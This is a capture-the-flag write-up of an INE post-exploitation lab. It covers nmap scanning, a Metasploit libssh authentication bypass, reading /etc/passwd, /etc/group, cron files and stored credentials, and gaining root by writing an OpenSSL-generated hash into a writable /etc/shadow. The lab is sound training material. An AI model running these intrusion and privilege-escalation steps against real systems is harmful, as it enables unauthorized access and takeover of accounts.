Post-Exploitation refers to the phase in a penetration test or cyberattack that occurs after an attacker successfully gains access to a system or network. During this phase, the attacker aims to maximize the value of their access by escalating privileges, maintaining persistence, and gathering sensitive information. Post-exploitation techniques include pivoting to other systems, extracting passwords, exfiltrating confidential data, and leveraging compromised systems to further penetrate the network. The goal is to identify critical assets, assess the extent of the breach, and map out pathways for potential lateral movement within the target environment. Post-exploitation also focuses on covering tracks to evade detection and ensuring continued access, emphasizing the need for strong monitoring and rapid response mechanisms to prevent further compromise.

This lab is designed to challenge and refine your skills in Post-Exploitation techniques, focusing on identifying and uncovering hidden information within a target machine.

&nbsp;

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at **http://target1.ine.local** and **http://target2.ine.local**.

**Objective:** Execute Post-Exploitation techniques on the target to uncover hidden flags and fully exploit the compromised environment.

**Flags to Capture:**

- **Flag 1**: The file that stores user account details is worth a closer look. (target1.ine.local)
- **Flag 2**: User groups might reveal more than you expect.
- **Flag 3**: Scheduled tasks often have telling names. Investigate the cron jobs to uncover the secret.
- **Flag 4**: DNS configurations might point you in the right direction. Also, explore the home directories for stored credentials.
- **Flag 5**: Use the discovered credentials to gain higher privileges and explore the root's home directory on target2.ine.local.

# Tools

The best tools for this lab are:

- Nmap
- FTP
- OpenSSL

**Flag 1: The file that stores user account details is worth a closer look. (target1.ine.local)**

First and most try to find target ip's

cat /etc/hosts

arp -a

dig target.ine.local

nslookup target.ine.local

ping target.ine.local

![c0f17cba66e86d36f55312e4f53b19f2.png](resources/c0f17cba66e86d36f55312e4f53b19f2.png)

Then do the nmap

nmap -p- -sC -sV 192.58.111.4 -vvv -oA nmap full

![52c8d7a1d8ae7cd80a8233c075cc0f30.png](resources/52c8d7a1d8ae7cd80a8233c075cc0f30.png)

![b552e2be1a39a8f55b17b7d83c9da937.png](resources/b552e2be1a39a8f55b17b7d83c9da937.png)

nmap for second target

![8140c78aa7f1fa3fb06659f08b28dcad.png](resources/8140c78aa7f1fa3fb06659f08b28dcad.png)

There is an exploit on metasploit for libssh

![59ef62bd8fd5f48ae6774321c7b798fd.png](resources/59ef62bd8fd5f48ae6774321c7b798fd.png)

![e8aeec91d811107481d2590cd8535894.png](resources/e8aeec91d811107481d2590cd8535894.png)

that named: scanner/ssh/libssh_auth_bypass

![0b9cb4b8d612542a08d5eb91c3c606db.png](resources/0b9cb4b8d612542a08d5eb91c3c606db.png)

![3b6d1a510d96d4b057664f016036eba5.png](resources/3b6d1a510d96d4b057664f016036eba5.png)

set spawn_pty true

set rhosts target1 ipl

set CreateSession true

run

![ef7000c587e4a9254417847abe1b9088.png](resources/ef7000c587e4a9254417847abe1b9088.png)

d![c2bcd210df44c814f81c477bde0546e2.png](resources/c2bcd210df44c814f81c477bde0546e2.png)

&nbsp;

that file contains:

john:Pass@john123

lets enumerate users on system: flag1

![ae26b386e5b0c69b483177c6989cff2c.png](resources/ae26b386e5b0c69b483177c6989cff2c.png)

**Flag 2: User groups might reveal more than you expect.**

![ab6771fc70efe755aecf984d1f4b6a4a.png](resources/ab6771fc70efe755aecf984d1f4b6a4a.png)

cat /etc/group

![a5174814d170b8944c46f94859041e91.png](resources/a5174814d170b8944c46f94859041e91.png)

**Flag 3: Scheduled tasks often have telling names. Investigate the cron jobs to uncover the secret.**

cat /etc/cron.d/

cat /etc/crontab

cat /etc/cron.d/\*

These commands are used to inspect scheduled tasks managed by **cron** on a Linux system. Here's what each command does:

### **1\. `cat /etc/cron.d/`**

- This command lists the contents of the **`/etc/cron.d/`** directory.
- However, if used alone, it does **not** display file contents—just the filenames inside this directory.

### **2\. `cat /etc/crontab`**

- This command displays the contents of **`/etc/crontab`**, which is the system-wide crontab file.
    
- It defines scheduled tasks and environment variables for system maintenance.
    
- Example structure of `/etc/crontab`:
    
- This means `/path/to/script.sh` runs every day at 2:00 AM as the root user.
    

### **3\. `cat /etc/cron.d/*`**

- This command displays the contents of **all** files in `/etc/cron.d/`.
    
- The `/etc/cron.d/` directory contains custom cron jobs defined by system packages or administrators.
    
- Example entry in a file inside `/etc/cron.d/`:
    
    - Runs `/usr/local/bin/backup.sh` at **3:30 AM daily** as the root user.

### **Why are these important for security and pentesting?**

- **Privilege Escalation**: If cron jobs run as root and execute scripts that can be modified by a low-privileged user, it may be possible to escalate privileges.
- **Persistence**: Attackers can add malicious cron jobs for persistence.
- **Misconfigurations**: Weak permissions or exposed credentials in scripts executed by cron can be exploited.

&nbsp;

![7f5cf72a23d7b6a4147c5ace91fb922f.png](resources/7f5cf72a23d7b6a4147c5ace91fb922f.png)

&nbsp;

**Flag 4: DNS configurations might point you in the right direction. Also, explore the home directories for stored credentials.**

cat /etc/hosts

![8122ffa11e16f722b72de6dc6429503b.png](resources/8122ffa11e16f722b72de6dc6429503b.png)

**Flag 5: Use the discovered credentials to gain higher privileges and explore the root's home directory on target2.ine.local.**

Let’s start nmap scan on target2, john:Pass@john123 and this credential might be useful.

![06d063109d904964e152a248709c07be.png](resources/06d063109d904964e152a248709c07be.png)

ssh,smtp,http services are open. let’s try ssh with our credentials.

ssh john@192.178.236.3--> target2.ine.local

Password for john==> Pass@john123

![f42b14b2419e91c0da4b1145b513b680.png](resources/f42b14b2419e91c0da4b1145b513b680.png)

<span style="color: #242424;">We check file permissions and find that</span> `/etc/shadow` <span style="color: #242424;">is editable.</span>

<span style="color: #242424;">![f7e9a1020e01540732b452e4a52e8415.png](resources/f7e9a1020e01540732b452e4a52e8415.png)</span>

<span style="color: #242424;">![f7292daa97ed25509338ef987e71eb91.png](resources/f7292daa97ed25509338ef987e71eb91.png)</span>

<span style="color: #242424;"><span style="color: #242424;">We generate a new password hash using OpenSSL</span></span>

openssl passwd -1 -salt abc password

<span style="color: #242424;"><span style="color: #242424;">![63270ca6c3d3d81e70c994944107554b.png](resources/63270ca6c3d3d81e70c994944107554b.png)</span></span>

&nbsp;

<span style="color: #242424;">![4c77c5c1ed13c2399588e465c66c37dc.png](resources/4c77c5c1ed13c2399588e465c66c37dc.png)</span>

vim /etc/shadow is not working try to nano /etc/shadow

![2cf9f041019223aac59e4e8263e1f791.png](resources/2cf9f041019223aac59e4e8263e1f791.png)

<span style="color: #242424;"><span style="color: #242424;">![a0b2f2b120f3f25397c35c0fdaf8f7f1.png](resources/a0b2f2b120f3f25397c35c0fdaf8f7f1.png)</span></span>

<span style="color: #242424;">remove the \* and add hash value</span>

<span style="color: #242424;">The hash is then used to replace the root password in</span> `/etc/shadow`

<span style="color: #242424;">We switch to the root user using our ‘password’</span>

<span style="color: #242424;">![b6e095315252892b657619640cfe4653.png](resources/b6e095315252892b657619640cfe4653.png)</span>

&nbsp;

we are root!!

for flag5 follow this video Linux Privilege Escalatioon - Weak Permiossions  https://my.ine.com/CyberSecurity/courses/4350487c/host-network-penetration-testing-post-exploitation
